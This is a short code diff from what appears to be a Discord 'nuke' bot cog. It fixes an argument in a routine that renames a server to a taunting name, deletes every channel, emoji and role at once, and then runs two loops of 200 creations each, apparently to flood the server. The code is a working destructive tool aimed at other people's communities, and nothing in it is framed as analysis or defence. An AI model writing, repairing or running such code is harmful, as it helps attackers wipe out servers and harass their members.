@@ -80,7 +80,7 @@ class nuke(dortrox.Cog):
         await ctx.guild.edit(name="Rekted By Daddy Dortrox")
         await asyncio.gather(*[cd(channel.id) for channel in ctx.guild.channels])
         time.sleep(4)
-        await asyncio.gather(*[ed(emoji.id) for emoji in ctx.guild.emojis])
+        await asyncio.gather(*[ed(ctx, emoji.id) for emoji in ctx.guild.emojis])
         await asyncio.gather(*[rd(ctx, role.id) for role in ctx.guild.roles])
         await asyncio.gather(*[cs(ctx) for _ in range(200)])
         await asyncio.gather(*[rs(ctx) for _ in range(200)])
